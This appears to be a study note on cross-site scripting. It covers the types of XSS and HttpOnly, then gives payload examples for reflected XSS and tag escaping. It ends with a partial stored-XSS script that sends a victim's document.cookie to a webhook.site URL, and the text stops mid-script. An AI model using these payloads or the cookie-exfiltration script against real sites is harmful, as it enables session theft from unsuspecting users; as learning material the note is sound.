Cross-Site Scripting (XSS) is a web application injection vulnerability where an attacker injects malicious client-side scripts into a web page due to improper input validation or output encoding. When another user visits the page, the script executes in their browser. There are three types: Reflected XSS, Stored XSS, and DOM-Based XSS. The impact includes session hijacking, cookie theft, phishing, and unauthorized actions. It can be prevented using input validation, output encoding, Content Security Policy (CSP), and secure coding practices.





**Cross-site Scripting (XSS) :**

* It is type of Injection.
* commonly found in web application / browser.
* occurs due to an input validation failure where attacker inject malicious code.
* It makes it possible for attacker to inject malicious code (eg. JavaScript programs) into victim's web browser by executing that malicious code in server, so whenever victim visit then it will steal users information like session cookies.



**Types of XSS:**

1. **Reflected XSS:** The malicious input is immediately reflected in the server's response and executed in the victim's browser.

**2. Stored XSS:** The malicious script is permanently stored in the application's database or other storage and is executed whenever users view the affected content.

**3. DOM-Based XSS:** The vulnerability exists in the client-side JavaScript, where untrusted data is processed in an unsafe way without proper sanitization.





**# Why is HttpOnly important?**

The HttpOnly cookie attribute helps prevent client-side JavaScript from accessing session cookies, reducing the risk of session cookie theft through XSS. However, it does not prevent XSS itself.





***HTML/JavaScript Injection: (Reflected XSS)***

* check input area where we got reflection. eg. In login page we enter my name and that name is display in anywhere which is reflection.
* check which tag in html/Js that reflected input are placed.
* now enter your malicious html/Js code/payload in the input area where we enter my name.



* We can craft html malicious payload using tags like

&#x09;- <a href="URL"> link </a>

&#x09;- <img src="URL"/>

&#x09;- <iframe src="URL"></iframe>

* And for JavaScript we craft payload using tags like

&#x09;- <script>alert(document.cookie)<script/>

&#x09;- <script src='myjs.js'><script/>

&#x09;- <script>prompt(document.cookie)<script/>



***To Escape tag:***

eg. input tag in html consider as input but we bypass and execute our payload as follows:

Input for HTML: abc"><h1>Hello</h1>

Input for Js: abc"><script>alert('1')</script>

eg. <input .... value="abc"><script>alert('1')</script>





***Stored (SXSS) Injection:***

1. webhook.site 			... it is public collaborator which used to access an public web server.

2\. Get url from it.

3\. In input field add following script:

<script>
var img = document.createElement("img");
img.src="WEBHOOK\\\\\\\\\\\\\\\_URL"+"/cookie="+encodeURIComponent(document.cookie);
document.body.appendChild(img);

